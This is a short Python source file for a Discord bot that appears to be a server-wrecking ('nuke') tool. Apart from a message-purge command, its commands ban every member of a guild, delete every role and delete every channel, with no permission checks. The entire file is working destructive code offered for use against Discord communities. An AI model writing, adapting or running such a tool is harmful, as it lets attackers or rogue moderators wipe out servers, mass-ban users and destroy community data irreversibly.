import discord
from discord.ext import commands
from discord import *


TOKEN = 'ur token'
bot = commands.Bot(command_prefix='! ',pass_context=True)


def main():
    global bot
    print ("staring")
    run_commands()

def run_commands():
    @bot.command(pass_context=True)
    async def clear(ctx, amount=10):
        await ctx.channel.purge(limit=amount)  

                
    @bot.command(pass_context=True)         
    async def banall(ctx):
        for m in ctx.guild.members:
        	await m.ban(reason=".")


    @bot.command(pass_context=True)             
    async def delrole(ctx):
        for m in ctx.guild.roles:
                await m.delete(reason=".")


    @bot.command(pass_context=True)             
    async def delchannel(ctx):
        guild = ctx.guild
        for channel in ctx.guild.channels:
                await channel.delete()      
      

    bot.run(TOKEN)
                           
if __name__=="__main__":
    main()
